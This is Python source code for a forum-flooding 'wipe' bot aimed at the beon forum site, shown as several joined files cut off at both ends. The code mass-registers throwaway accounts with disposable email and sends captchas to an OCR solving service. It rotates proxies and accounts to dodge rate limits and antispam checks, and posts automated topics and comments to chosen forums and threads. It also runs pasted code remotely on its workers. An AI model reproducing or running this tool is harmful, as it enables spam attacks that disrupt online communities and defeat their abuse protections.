self.running.is_set():\n                # self.targets_from_witch()\n                if self.c.tcount == 0:\n                    self.inter_sleep(5)\n                    continue\n                self.pc.check_waiting()\n                new = self.read_newproxies()\n                if not new:\n                    self.inter_sleep(5)\n                    continue\n                self.add_spawns(new)\n        except WorkerInterrupt:\n            pass\n        except Exception as e:\n            self.log.exception(e)\n        self.terminate()\n        self.join_threads()\n        if self.c.tcount > 0:\n            self.save_users()\n            self.save_targets()\n\nwm = workers.WZWorkerThread(c.router_addr, WipeManager, (c,),\n    name='SpaghettiMonster')\nwm.start(ctx, sig_addr)\n\ndef add_target(domain, id_, tuser=None):\n    if domain not in targets:\n        targets[domain] = []\n    tlist = targets[domain]\n    id_ = str(id_)\n    tuser = tuser or ''\n    t = (tuser, id_)\n    logger.info('Appending %s to targets[%s]', repr(t), domain)\n    tlist.append(t)\n\ndef remove_target(domain, id_, tuser=None):\n    tlist = targets[domain]\n    id_ = str(id_)\n    tuser = tuser or ''\n    t = (tuser, id_)\n    logger.info('Removing %s from targets[%s]', repr(t), domain)\n    tlist.remove(t)\n\ndef add_target_exc(domain, id_, tuser=None):\n    if domain not in targets:\n        targets[domain] = []\n    tlist = targets[domain]\n    id_ = str(id_)\n    tuser = tuser or ''\n    t = (tuser, id_)\n    if t in protected:\n        raise ValueError('%s is protected' % repr(t))\n    if t not in tlist:\n        logger.info('Appending %s to targets[%s]', repr(t), domain)\n        tlist.append(t)\n\nr_di = re.compile(regexp.f_udi)\n\ndef atfu(urls):\n    for user, domain, id1, id2 in r_di.findall(urls):\n        id_ = id1+id2\n        add_target(domain, id_, user)\n\ndef rtfu(urls):\n    for user, domain, id1, id2 in r_di.findall(urls):\n        id_ = id1+id2\n        remove_target(domain, id_, user)\n\ndef get_forum_id(name):\n    id_ = d.bm_id_forum.get_key(name)\n    int(id_, 10)  # id is int with base 10\n    return id_\n\n# def aftw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Appending %s (%s) to forums', name, id_)\n#     forums.append(id_)\n\n# def rffw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Removing %s (%s) from forums', name, id_)\n#     forums.remove(id_)\n\n# def aftw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Appending %s to forums', name)\n#     forums.add(name)\n\n# def rffw(name):\n#     id_ = get_forum_id(name)\n#     logger.info('Removing %s from forums', name)\n#     forums.remove(name)\n\nr_udf = re.compile(regexp.udf_prefix)\n\ndef affu(urls):\n    for user, domain, forum in r_udf.findall(urls):\n        if domain not in forums:\n            forums[domain] = set()\n        if len(forum) > 0:\n            get_forum_id(forum)\n        logger.info('Appending %s:%s to forums[%s]', user, forum, domain)\n        forums[domain].add((user, forum))\n\ndef rffu(urls):\n    for user, domain, forum in r_udf.findall(urls):\n        if len(forum) > 0:\n            get_forum_id(forum)\n        logger.info('Removing %s:%s from forums[%s]', user, forum, domain)\n        forums[domain].remove((user, forum))\n\ndef add_user(domain, login, passwd):\n    uq = wm.get_userqueue(domain)\n    uq.put({'login': login, 'passwd': passwd}, False)\n\ndef send_to_wm(frames):\n    msg = [frames[0]]\n    msg.extend(wzrpc.make_sig_msg(frames[1], frames[2], frames[3:]))\n    sig_sock.send_multipart(msg)\n\ndef send_passthrough(frames):\n    msg = [b'WipeManager']\n    msg.extend(wzrpc.make_sig_msg(b'WipeManager', b'passthrough', frames))\n    sig_sock.send_multipart(msg)\n\ndef get_pasted_lines(sentinel):\n    'Yield pasted lines until the user enters the given sentinel value.'\n    print(\"Pasting code; enter '{0}' alone on the line to stop.\".format(sentinel))\n    while True:\n        l = input(':')\n        if l == sentinel:\n            return\n        else:\n            yield l\n\ndef send_execute_to_wm(code):\n    msg = [b'WipeManager']\n    msg.extend((b'WZWorker', b'execute', code))\n    send_to_wm(msg)\n\ndef send_execute_to_ev(code):\n    msg = [b'EVProxy']\n    msg.extend((b'WZWorker', b'execute', code))\n    send_passthrough(msg)\n\ndef send_execute(name, code):\n    msg = [name.encode('utf-8')]\n    msg.extend((b'WZWorker', b'execute', code))\n    send_passthrough(msg)\n\ndef pexecute_in(name):\n    send_execute(name, '\\n'.join(get_pasted_lines('--')).encode('utf-8'))\n\ndef pexecute_in_wm():\n    send_execute_to_wm('\\n'.join(get_pasted_lines('--')).encode('utf-8'))\n\ndef pexecute_in_ev():\n    send_execute_to_ev('\\n'.join(get_pasted_lines('--')).encode('utf-8'))\n\ndef drop_users():\n    send_passthrough([b'WipeSkel', b'WipeSkel', b'drop-user'])\n\ndef log_spawn_name():\n    send_passthrough([b'WipeThread', b'WipeThread', b'log-spawn-name'])\n\ntry:\n    import IPython\n    if c.no_shell:\n        IPython.embed_kernel()\n    else:\n        IPython.embed()\nexcept ImportError:\n    # fallback shell\n    if c.no_shell:\n        while True:\n            time.sleep(1)\n    else:\n        while True:\n            try:\n                exec(input('> '))\n            except KeyboardInterrupt:\n                print(\"KeyboardInterrupt\")\n            except SystemExit:\n                break\n            except:\n                print(traceback.format_exc())\n\nterminate()\n/n/n/nuniwipe.py/n/n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nfrom sup.net import NetError\nfrom wzworkers import WorkerInterrupt\nfrom wipeskel import WipeSkel, WipeState, cstate\nfrom beon import exc, regexp\nfrom collections import ChainMap\nimport re\n\nclass UniWipe(WipeSkel):\n    def __init__(self, forums, targets, sbjfun, msgfun, *args, **kvargs):\n        self.sbjfun = sbjfun\n        self.msgfun = msgfun\n        self.forums = forums\n        self.targets = (type(targets) == str and [('', targets)]\n                        or type(targets) == tuple and list(targets)\n                        or targets)\n        super().__init__(*args, **kvargs)\n        self.ignore_map = ChainMap(\n            self.pc.sets['closed'], self.pc.sets['bumplimit'],\n            self.pc.sets['bugged'], self.pc.sets['protected'],\n            self.targets)\n\n    def on_caprate_limit(self, rate):\n        if not self.logined:\n            self._capdata = (0, 0)\n            return\n        self.log.warning('Caprate limit reached, calling dologin() for now')\n        self.dologin()\n        # super().on_caprate_limit(rate)\n\n    def comment_loop(self):\n        for t in self.targets:\n            self.schedule(self.add_comment, (t, self.msgfun()))\n        if len(self.targets) == 0:\n            self.schedule(self.scan_targets_loop)\n        else:\n            self.schedule(self.comment_loop)\n\n    def add_comment(self, t, msg):\n        # with cstate(self, WipeState.posting_comment):\n        if True: # Just a placeholder\n            try:\n                # self.counter_tick()\n                self.postmsg(t[1], msg, t[0])\n            except exc.Success as e:\n                self.counters['comments'] += 1\n                self.w.sleep(self.comment_successtimeout)\n            except exc.Antispam as e:\n                self.w.sleep(self.comment_successtimeout)\n                self.schedule(self.add_comment, (t, msg))\n            except (exc.Closed, exc.UserDeny) as e:\n                try:\n                    self.targets.remove(t)\n                except ValueError:\n                    pass\n                self.w.sleep(self.comment_successtimeout)\n            except exc.Captcha as e:\n                self.log.error('Too many wrong answers to CAPTCHA')\n                self.schedule(self.add_comment, (t, msg))\n            except exc.UnknownAnswer as e:\n                self.log.warn('%s: %s', e, e.answer)\n                self.schedule(self.add_comment, (t, msg))\n            except exc.Wait5Min as e:\n                self.schedule(self.add_comment, (t, msg))\n                self.schedule_first(self.switch_user)\n            except exc.EmptyAnswer as e:\n                self.log.info('Removing %s from targets and adding to bugged', t)\n                self.pc.sets['bugged'].add(t)\n                try:\n                    self.targets.remove(t)\n                except ValueError as e:\n                    pass\n                self.w.sleep(self.errortimeout)\n            except exc.TopicDoesNotExist as e:\n                self.log.info('Removing %s from targets and adding to bugged', t)\n                self.pc.sets['bugged'].add(t)\n                try:\n                    self.targets.remove(t)\n                except ValueError as e:\n                    pass\n                self.w.sleep(self.errortimeout)\n            except exc.TemporaryError as e:\n                self.schedule(self.add_comment, (t, msg))\n                self.w.sleep(self.errortimeout)\n            except exc.PermanentError as e:\n                try:\n                    self.targets.remove(t)\n                except ValueError as e:\n                    pass\n                self.w.sleep(self.errortimeout)\n            except UnicodeDecodeError as e:\n                self.log.exception(e)\n                self.w.sleep(self.errortimeout)\n\n    def forumwipe_loop(self):\n        for f in self.forums.copy():\n            self.counter_tick()\n            try:\n                self.addtopic(self.msgfun(), self.sbjfun(), f)\n            except exc.Success as e:\n                self.counters['topics'] += 1\n                self.w.sleep(self.topic_successtimeout)\n            except exc.Wait5Min as e:\n                self.topic_successtimeout = self.topic_successtimeout + 0.1\n                self.log.info('Wait5Min exc caught, topic_successtimeout + 0.1, cur: %f',\n                    self.topic_successtimeout)\n                self.w.sleep(self.topic_successtimeout)\n            except exc.Captcha as e:\n                self.log.error('Too many wrong answers to CAPTCHA')\n                self.long_sleep(10)\n            except exc.UnknownAnswer as e:\n                self.log.warning('%s: %s', e, e.answer)\n                self.w.sleep(self.errortimeout)\n            except exc.PermanentError as e:\n                self.log.error(e)\n                self.w.sleep(self.errortimeout)\n            except exc.TemporaryError as e:\n                self.log.warn(e)\n                self.w.sleep(self.errortimeout)\n\n    def get_targets(self):\n        found_count = 0\n        for user, forum in self.forums:\n            targets = []\n            self.log.debug('Scanning first page of the forum %s:%s', user, forum)\n            page = self.site.get_page('1', forum, user)\n            rxp = re.compile(regexp.f_sub_id.format(user, self.site.domain, forum))\n            found = set(map(lambda x: (user, x[0]+x[1]), rxp.findall(page)))\n            for t in found:\n                if t in self.ignore_map:\n                    continue\n                targets.append(t)\n            lt = len(targets)\n            found_count += lt\n            if lt > 0:\n                self.log.info('Found %d new targets in forum %s:%s', lt, user, forum)\n            else:\n                self.log.debug('Found no new targets in forum %s:%s', user, forum)\n            self.targets.extend(targets)\n        return found_count\n\n    def scan_targets_loop(self):\n        with cstate(self, WipeState.scanning_for_targets):\n            while len(self.targets) == 0:\n                c = self.get_targets()\n                if c == 0:\n                    self.log.info('No targets found at all, sleeping for 30 seconds')\n                    self.long_sleep(30)\n            self.schedule(self.comment_loop)\n        if len(self.forums) == 0:\n            self.schedule(self.wait_loop)\n\n    def wait_loop(self):\n        if len(self.targets) > 0:\n            self.schedule(self.comment_loop)\n            return\n        if len(self.forums) == 0:\n            with cstate(self, WipeState.waiting_for_targets):\n                while len(self.forums) == 0:\n                    # To prevent a busy loop.\n                    self.counter_tick()\n                    self.w.sleep(1)\n        self.schedule(self.scan_targets_loop)\n\n    def _run(self):\n        self.schedule(self.dologin)\n        self.schedule(self.wait_loop)\n        self.schedule(self.counter_ticker.tick)\n        try:\n            self.perform_tasks()\n        except NetError as e:\n            self.log.error(e)\n        except WorkerInterrupt as e:\n            self.log.warning(e)\n        except Exception as e:\n            self.log.exception(e)\n        self.return_user()\n# tw_flag = False\n# if len(self.targets) > 0:\n#     with cstate(self, WipeState.posting_comment):\n#         while len(self.targets) > 0:\n#             self.threadwipe_loop()\n#     if not tw_flag:\n#         tw_flag = True\n# if tw_flag:\n#     # Sleep for topic_successtimeout after last comment\n#     # to prevent a timeout spike\n#     self.w.sleep(self.topic_successtimeout)\n#     tw_flag = False\n# with cstate(self, WipeState.posting_topic):\n# self.forumwipe_loop()\n/n/n/nwipeskel.py/n/n# -*- coding: utf-8 -*-\n# -*- mode: python -*-\nimport logging, re\nfrom queue import Queue, Empty\nimport zmq\nimport beon, sup, wzrpc\nfrom beon import regexp\nfrom wzworkers import WorkerInterrupt\nfrom ocr import OCRError, PermOCRError, TempOCRError\nfrom sup.ticker import Ticker\nfrom userdata import short_wordsgen\nfrom enum import Enum\nfrom collections import Counter, deque\n\nclass ProcessContext:\n    def __init__(self, name, ctx, wz_addr, noproxy_rp):\n        self.log = logging.getLogger('.'.join((name, type(self).__name__)))\n        self.zmq_ctx = ctx\n        self.ticker = Ticker()\n        self.sets = {}\n        self.sets['waiting'] = dict()\n        self.sets['pending'] = set()\n\n        self.sets['targets'] = set()\n        self.sets['closed'] = set()\n        self.sets['bumplimit'] = set()\n        self.sets['protected'] = set()\n        self.sets['bugged'] = set()\n\n        self.wz_addr = wz_addr\n        self.noproxy_rp = noproxy_rp\n\n    def make_wz_sock(self):\n        self.log.debug('Initializing WZRPC socket')\n        wz_sock = self.zmq_ctx.socket(zmq.DEALER)\n        wz_sock.setsockopt(zmq.IPV6, True)\n        wz_sock.connect(self.wz_addr)\n        return wz_sock\n\n    def check_waiting(self):\n        elapsed = self.ticker.elapsed()\n        waiting = self.sets['waiting']\n        for k, v in waiting.copy().items():\n            rem = v - elapsed\n            if rem <= 0:\n                del waiting[k]\n                self.log.info('Removing %s from %s', k[0], k[1])\n                try:\n                    self.sets[k[1]].remove(k[0])\n                except KeyError:\n                    self.log.error('No %s in %s', k[0], k[1])\n            else:\n                waiting[k] = rem\n\n    def add_waiting(self, sname, item, ttl):\n        self.sets['waiting'][(item, sname)] = ttl\n\nclass WTState(Enum):\n    null = 0\n    starting = 2\n    empty = 3\n    sleeping = 4\n    running = 5\n\nclass WipeState(Enum):\n    null = 0\n    starting = 2\n    terminating = 3\n    sleeping = 4\n    running = 5\n\n    logging_in = 6\n    post_login_hooks = 7\n    registering = 8\n    pre_register_hooks = 9\n    post_register_hooks = 10\n    deobfuscating_capage = 11\n    solving_captcha = 12\n    reporting_code = 13\n\n    operation = 50\n    waiting_for_targets = 51\n    scanning_for_targets = 52\n    posting_comment = 53\n    posting_topic = 54\n\nclass state:\n    def __init__(self, defstate):\n        self.defstate = defstate\n        self.state = defstate\n\n    def __call__(self, state):\n        self.state = state\n        return self\n\n    def __enter__(self):\n        pass\n\n    def __exit__(self, exception_type, exception_value, traceback):\n        self.state = self.defstate\n\n    @property\n    def name(self):\n        return self.state.name\n\n    @property\n    def value(self):\n        return self.state.value\n\nclass cstate:\n    def __init__(self, obj, state):\n        self.obj = obj\n        self.backstate = obj.state\n        self.newstate = state\n\n    def __enter__(self):\n        self.obj.log.info('Switching state to %s', repr(self.newstate))\n        self.obj.state = self.newstate\n\n    def __exit__(self, exception_type, exception_value, traceback):\n        self.obj.log.info('Switching state to %s', repr(self.backstate))\n        self.obj.state = self.backstate\n\n\nclass WipeThread:\n    def __init__(self, pc, spawnqueue, *args, **kvargs):\n        self.pc = pc\n        self.spawnqueue = spawnqueue\n        self.spawn = None\n        self.state = WTState.null\n        self.wz_reply = None\n\n    def deobfuscate_capage(self, domain, page):\n        result = []\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success or status == wzrpc.status.error:\n                result.extend(map(lambda x: x.decode('utf-8'), data))\n            elif status == wzrpc.status.e_req_denied:\n                self.log.warn('Status {0}, reauthentificating'.\n                    format(wzrpc.name_status(status)))\n                self.p.auth_requests()\n                that.retry = True\n            elif status == wzrpc.status.e_timeout:\n                self.log.warn('Timeout {0}, retrying'.format(data[0]))\n                that.retry = True\n            else:\n                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))\n                that.retry = True\n        self.p.wz_wait_reply(accept,\n            b'Evaluator', b'evaluate', (domain.encode('utf-8'), page.encode('utf-8')),\n            timeout=60)\n        return tuple(result)\n\n    def solve_captcha(self, img):\n        result = []\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success or status == wzrpc.status.error:\n                result.extend(map(lambda x:x.decode('utf-8'), data))\n            elif status == wzrpc.status.e_req_denied:\n                self.log.warn('Status {0}, reauthentificating'.\\\n                    format(wzrpc.name_status(status)))\n                self.p.auth_requests()\n                that.retry = True\n            elif status == wzrpc.status.e_timeout:\n                self.log.warn('Timeout {0}, retrying'.format(data[0]))\n                that.retry = True\n            else:\n                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))\n                that.retry = True\n        self.p.wz_wait_reply(accept,\n            b'Solver', b'solve', (b'inbound', img), timeout=300)\n        if len(result) == 2: # Lame and redundant check. Rewrite this part someday.\n            return result\n        else:\n            raise OCRError('Solver returned error %s', result)\n        return tuple(result)\n\n    def report_code(self, cid, status):\n        def accept(that, reqid, seqnum, status, data):\n            if status == wzrpc.status.success:\n                self.log.debug('Successfully reported captcha status')\n            elif status == wzrpc.status.error:\n                self.log.error('Solver returned error on report: %s', repr(data))\n            elif status == wzrpc.status.e_req_denied:\n                self.log.warn('Status {0}, reauthentificating'.\\\n                    format(wzrpc.name_status(status)))\n                self.p.auth_requests()\n            else:\n                self.log.warn('Status {0}, retrying'.format(wzrpc.name_status(status)))\n                that.retry = True\n        self.p.wz_wait_reply(accept,\n            b'Solver', b'report', (status.encode('utf-8'), cid.encode('utf-8')))\n\n    def __call__(self, parent):\n        self.p = parent\n        self.log = parent.log\n        self.running = parent.running\n        self.sleep = parent.inter_sleep\n        self.p.wz_auth_requests = [\n            (b'Evaluator', b'evaluate'),\n            (b'Solver', b'solve'),\n            (b'Solver', b'report')]\n        cst = cstate(self, WTState.starting)\n        cst.__enter__()\n        self.p.sig_sock.setsockopt(zmq.SUBSCRIBE, b'WipeThread')\n        def handle_lsn(interface, method, data):\n            if hasattr(self, 'spawn') and self.spawn:\n                self.log.info('My current spawn is %s, state %s',\n                    self.spawn.name, self.spawn.state.name)\n            else:\n                self.log.debug('Currently I do not have spawn')\n        self.p.wz.set_sig_handler(b'WipeThread', b'log-spawn-name', handle_lsn)\n        def handle_te(interface, method, data):\n            if self.state is WTState.empty:\n                self.p.term()\n        self.p.wz.set_sig_handler(b'WipeThread', b'terminate-empty', handle_te)\n\n        try:\n            self.p.wz_connect()\n            self.p.auth_requests()\n        except WorkerInterrupt as e:\n            self.log.error(e)\n            return\n        with cstate(self, WTState.empty):\n            while self.running.is_set():\n                try:\n                    self.spawn = self.spawnqueue.get(False)\n                except Empty:\n                    self.sleep(1)\n                    continue\n                with cstate(self, WTState.running):\n                    try:\n                        self.spawn.run(self)\n                    except WorkerInterrupt as e:\n                        self.log.error(e)\n                    except Exception as e:\n                        self.log.exception('Spawn throwed exception %s, requesting new', e)\n                    del self.spawn\n                    self.spawn = None\n                    self.spawnqueue.task_done()\n        cst.__exit__(None, None, None)\n\nclass WipeSkel(object):\n    reglimit = 10\n    loglimit = 10\n    conlimit = 3\n    catrymax = 3\n    _capdata = (0, 0)\n    caprate = 0\n    caprate_minp = 10\n    caprate_limit = 0.9\n    successtimeout = 1\n    comment_successtimeout = 0\n    topic_successtimeout = 0.8\n    counter_report_interval = 60\n    errortimeout = 3\n    uqtimeout = 5  # Timeout for userqueue\n    stoponclose = True\n    die_on_neterror = False\n\n    def __init__(self, pc, rp, domain, mrc, userqueue=None):\n        self.pc = pc\n        self.rp = rp\n        self.state = WipeState.null\n        self.site = beon.Beon(domain, self.http_request)\n        self.name = '.'.join((\n            type(self).__name__,\n            self.rp.proxy.replace('.', '_') if self.rp.proxy\n            else 'noproxy',\n            self.site.domain.replace('.', '_')))\n        self.rp.default_encoding = 'cp1251'\n        self.rp.default_decoding = 'cp1251'\n        self.rp.def_referer = self.site.ref  # Referer for net.py\n        self.hooks = {\n            'pre_register_new_user': [],\n            'post_register_new_user': [],\n            'post_login': [],\n            'check_new_user': [],\n        }\n        self.counter_ticker = Ticker()\n        self.counters = Counter()\n        self.task_deque = deque()\n        self.logined = False\n        self.noproxy_rp = self.pc.noproxy_rp\n        self.mrc = mrc\n        if userqueue:\n            self.userqueue = userqueue\n        else:\n            self.userqueue = Queue()\n\n    def schedule(self, task, args=(), kvargs={}):\n        self.task_deque.appendleft((task, args, kvargs))\n\n    def schedule_first(self, task, args=(), kvargs={}):\n        self.task_deque.append((task, args, kvargs))\n\n    def perform_tasks(self):\n        with cstate(self, WipeState.running):\n            while self.w.running.is_set():\n                self.counter_tick()\n                try:\n                    t = self.task_deque.pop()\n                except IndexError:\n                    return\n                t[0](*t[1], **t[2])\n\n    def long_sleep(self, time):\n        time = int(time)\n        with cstate(self, WipeState.sleeping):\n            step = int(time/10 if time > 10 else 1)\n            for s in range(0, time, step):\n                self.w.sleep(step)\n                self.counter_tick()\n\n    def http_request(self, url, postdata=None, onlyjar=False, referer=None,\n                     encoding=None, decoding=None):\n        _conc = 0\n        while self.w.running.is_set():\n            _conc += 1\n            try:\n                return self.rp.http_req(\n                    url, postdata, onlyjar, referer, encoding, decoding)\n            except sup.NetError as e:\n                if isinstance(e, sup.ConnError):\n                    if self.die_on_neterror and _conc > self.conlimit:\n                        raise\n                    self.log.warn('%s, waiting. t: %s', e.args[0], _conc)\n                    self.w.sleep(self.errortimeout)\n                else:\n                    self.log.error('%d %s', e.ec, e.args[0])\n                    if self.die_on_neterror:\n                        raise\n                    else:\n                        self.w.sleep(10)\n        else:\n            raise WorkerInterrupt()\n\n    def gen_userdata(self):\n        return short_wordsgen()\n\n    def update_caprate(self, got):\n        p, g = self._capdata\n        p += 1\n        if got is True:\n            self.counters['captchas'] += 1\n            g += 1\n        if p >= 255:\n            p = p/2\n            g = g/2\n        self._capdata = (p, g)\n        self.caprate = g/p\n        self.log.debug('Caprate: pos:%f got:%f rate:%f',\n                       p, g, self.caprate)\n        if (self.caprate_limit > 0\n            and p > self.caprate_minp\n            and self.caprate > self.caprate_limit):\n            self.on_caprate_limit(self.caprate)\n            # if self.getuser() == 'guest':\n            #     self.log.info(\"lol, we were trying to post from guest\")\n            #     while not self.relogin(): self.w.sleep(self.errortimeout)\n            # else:\n            #     while not self.dologin(): self.w.sleep(self.errortimeout)\n\n    def counter_tick(self):\n        if self.counter_report_interval == 0:\n            return\n        e = self.counter_ticker.elapsed(False)\n        if e > self.counter_report_interval:\n            self.counter_ticker.tick()\n            ccount = self.counters['comments']\n            tcount = self.counters['topics']\n            if ccount > 0:\n                self.log.info('%d comments in %d seconds, %0.2f cps, %0.2f caprate',\n                    ccount, e, ccount/e, self.caprate)\n                self.counters['comments'] = 0\n            if tcount > 0:\n                self.log.info('%d topics in %d seconds, %0.2f tps, %0.2f caprate',\n                    tcount, e, tcount/e, self.caprate)\n                self.counters['topics'] = 0\n\n    def on_caprate_limit(self, rate):\n        if not self.logined:\n            self._capdata = (0, 0)\n            return\n        self.log.warn('Caprate %f is over the limit', rate)\n        raise Exception('Caprate limit reached')\n\n    def captcha_wrapper(self, inc_fun, fin_fun, *args, **kvargs):\n        # TODO: report codes after solving cycle instead of scheduling them.\n        try:\n            self.log.debug('captcha_wrapper: calling inc_fun %s', repr(inc_fun))\n            self.log.error('captcha_wrapper: inc_fun returned %s',\n                           repr(inc_fun(*args, **kvargs)))\n        except beon.Success as e:\n            self.update_caprate(False)\n            raise\n        except beon.Captcha as e:\n            self.log.warn(e)\n            _page = e.page\n            _catry = e.catry\n            # Don't update caprate with positives if not logined\n            if self.logined is True:\n                try:\n                    user = self.find_login(_page)\n                except beon.PermanentError:\n                    self.log.debug(e)\n                else:\n                    if user != self.site.ud['login']:\n                        self.log.warn('We were posting as %s, but our login is %s',\n                                      user, self.site.ud['login'])\n                        self.schedule_first(self.relogin)\n                        return\n            self.update_caprate(True)\n            reports = []\n            def r():\n                if len(reports) > 0:\n                    with cstate(self, WipeState.reporting_code):\n                        for cid, status in reports:\n                            self.report_code(cid, status)\n                    reports.clear()\n            while self.w.running.is_set():\n                _requested_new = False\n                try:\n                    with cstate(self, WipeState.solving_captcha):\n                        cahash, cacode, cid = self.solve_captcha(_page)\n                except TempOCRError as e:\n                    self.log.error('OCRError: %s, retrying', e)\n                    self.w.sleep(self.errortimeout)\n                    continue\n                except OCRError as e:\n                    self.log.error('OCRError: %s, requesting new captcha', e)\n                    _requested_new = True\n                    cahash, cacode, cid = e.cahash, '', None\n                else:\n                    self.log.info('code: %s', cacode)\n                try:\n                    self.log.debug('captcha_wrapper calling fin_fun %s', repr(fin_fun))\n                    self.log.error('captcha_wrapper: fin_fun returned %s',\n                        repr(fin_fun(cahash, cacode, *args, catry=_catry, **kvargs)))\n                    break\n                except beon.Success as e:\n                    self.counters['captchas_solved'] += 1\n                    if cid:\n                        reports.append((cid, 'good'))\n                    r()\n                    raise\n                except beon.Captcha as e:\n                    _catry = e.catry\n                    _page = e.page\n                    if _requested_new:\n                        self.log.warn('New captcha requested c:%d', _catry)\n                        continue\n                    self.log.warn('%s c:%d', e, _catry)\n                    self.counters['captchas_wrong'] += 1\n                    if cid:\n                        reports.append((cid, 'bad'))\n                    if _catry > self.catrymax:\n                        r()\n                        raise\n                except Exception as e:\n                    if cid:\n                        reports.append((cid, 'bad'))\n                    r()\n                    raise\n\n    def adaptive_timeout_wrapper(self, fun, *args, **kvargs):\n        try:\n            return fun(*args, **kvargs)\n        except beon.Antispam as e:\n            self.log.info('Antispam exc caught, successtimeout + 0.1, cur: %f',\n                          self.successtimeout)\n            self.successtimeout = self.successtimeout + 0.1\n            raise\n\n    def register_new_user(self):\n        with cstate(self, WipeState.registering):\n            _regcount = 0\n            while self.w.running.is_set():\n                self.w.p.poll(0)\n                ud = self.gen_userdata()\n                self.request_email(ud)\n                for c in self.hooks['pre_register_new_user']:\n                    c(self, ud)\n                self.log.info('Generated new userdata: %s, registering', ud['login'])\n                self.log.debug('Userdata: %s', repr(ud))\n                try:\n                    udc = ud.copy()\n                    if 0 in udc:\n                        del udc[0]\n                    self.register(**udc)\n                except beon.Success as e:\n                    self.validate_email(ud)\n                    for c in self.hooks['post_register_new_user']:\n                        c(self, ud)\n                    return ud\n                except (beon.EmptyAnswer, beon.Wait5Min) as e:\n                    self.log.error('%s, sleeping for 100 seconds', e)\n                    self.long_sleep(100)\n                except beon.Captcha as e:\n                    self.log.error('Too much wrong answers to CAPTCHA')\n                    continue\n                except beon.UnknownAnswer as e:\n                    _regcount += 1\n                    if not _regcount < self.reglimit:\n                        raise beon.RegRetryLimit('Cannot register new user')\n                    self.log.error('%s, userdata may be invalid, retrying c:%d',\n                                e, _regcount)\n                    self.w.sleep(self.errortimeout)\n            else:\n                raise WorkerInterrupt()\n\n    def get_new_user(self):\n        ud = self.userqueue.get(True, self.uqtimeout)\n        self.userqueue.task_done()\n        for c in self.hooks['check_new_user']:\n            c(self, ud)\n        return ud\n\n    def login(self, login, passwd, **kvargs):\n        if not self.site.login_lock.acquire(False):\n            with self.site.login_lock.acquire():\n                return\n        self.logined = False\n        try:\n            self.captcha_wrapper(self.site.logininc, self.site.loginfin,\n                                 login, passwd, **kvargs)\n        except beon.Success as e:\n            self.logined = True\n            self.counters['logged_in'] += 1\n            self.log.info(e)\n            raise\n        finally:\n            self.site.login_lock.release()\n\n    def find_login(self, rec):\n        try:\n            return re.findall(regexp.var_login, rec)[0]\n        except IndexError:\n            raise beon.PermanentError('No users in here')\n\n    def get_current_login(self):\n        return self.find_login(self.site.get_page('1'))\n\n    def dologin(self):\n        '''Choose user, do login and return it.'''\n        while self.w.running.is_set():\n            self.site.ud = None\n            try:\n                self.site.ud = self.get_new_user()\n            except Empty:\n                self.log.info('No users in queue')\n                self.site.ud = self.register_new_user()\n                return\n            try:\n                with cstate(self, WipeState.logging_in):\n                    self.login(self.site.ud['login'], self.site.ud['passwd'])\n            except beon.Success as e:\n                self.site.postuser = self.site.ud['login']\n                self.site.postpass = self.site.ud['passwd']\n                self.validate_email(self.site.ud)\n                for c in self.hooks['post_login']:\n                    c(self, self.site.ud)\n                self.w.sleep(self.successtimeout)\n                return\n            except beon.Captcha as e:\n                self.log.error('Too many wrong answers to CAPTCHA')\n                self.schedule(self.long_sleep, (10,))\n                self.schedule(self.dologin)\n            except beon.InvalidLogin as e:\n                self.log.error(\"Invalid login, passing here\")\n                self.schedule(self.dologin)\n                self.w.sleep(self.errortimeout)\n            except beon.TemporaryError as e:\n                self.userqueue.put(self.site.ud)\n                self.log.warn(e)\n                self.schedule(self.dologin)\n                self.w.sleep(self.errortimeout)\n        # else:\n        #     pending = len(self.pc.sets['pending'])\n        #     self.log.warn(\"No more logins here, %s pending.\"%pending)\n        #     if pending == 0: return False\n\n    def relogin(self):\n        '''Relogin with current user or do login'''\n        if 'login' in self.site.ud:\n            while self.w.running.is_set():\n                try:\n                    with cstate(self, WipeState.logging_in):\n                        self.login(self.site.ud['login'], self.site.ud['passwd'])\n                except beon.Success as e:\n                    for c in self.hooks['post_login']:\n                        c(self, self.site.ud)\n                    self.w.sleep(self.successtimeout)\n                    return\n                except beon.InvalidLogin as e:\n                    self.log.error(e)\n                    self.w.sleep(self.errortimeout)\n                    break\n                except beon.TemporaryError as e:\n                    self.log.warn(e)\n                    self.w.sleep(self.errortimeout)\n                    continue\n        self.dologin()\n\n    def request_email(self, ud):\n        ud['email'] = self.mailrequester.gen_addr()\n        ud[0]['email_service'] = type(self.mailrequester).__name__\n        ud[0]['email_requested'] = False\n        ud[0]['email_validated'] = False\n\n    def validate_email(self, ud):\n        if ('email' not in ud or\n            'email_service' not in ud[0] or\n            'email_requested' not in ud[0] or\n            'email_validated' not in ud[0] or\n            not ud[0]['email_service'] == type(self.mailrequester).__name__\n            or ud[0]['email_validated'] is True):\n            return\n        if not ud[0]['email_requested']:\n            try:\n                self.site.validate_email_inc()\n            except beon.Success as e:\n                ud[0]['email_requested'] = True\n                self.log.info(e)\n        self.log.info('Requesting messages for %s', ud['email'])\n        messages = self.mailrequester.get_messages(ud['email'])\n        for msg in messages:\n            if not msg['mail_from'].find('<reminder@{0}>'.format(self.site.domain)):\n                continue\n            h = re.findall(regexp.hashinmail.format(self.site.domain),\n                msg['mail_html'])\n            if len(h) > 0:\n                try:\n                    self.site.validate_email_fin(h[0])\n                except beon.Success as e:\n                    ud[0]['email_validated'] = True\n                    self.log.info(e)\n\n    def switch_user(self):\n        '''Log in with new user, but return the previous one'''\n        if 'login' in self.site.ud:\n            self.log.info('Switching user %s', self.site.ud['login'])\n            self.return_user()\n        self.site.ud = self.register_new_user()\n\n    def return_user(self, ud=None):\n        if not ud:\n            if (hasattr(self.site, 'ud') and self.site.ud):\n                ud = self.site.ud\n                self.site.ud = None\n            else:\n                return\n        self.log.info('Returning user %s to userqueue', ud['login'])\n        self.userqueue.put(ud, False)\n\n    def postmsg(self, target, msg, tuser=None, **kvargs):\n        tpair = (tuser, target)\n        target = target.lstrip('0')\n        try:\n            try:\n                self.site.ajax_addcomment(target, msg, tuser, **kvargs)\n            except beon.Success as e:\n                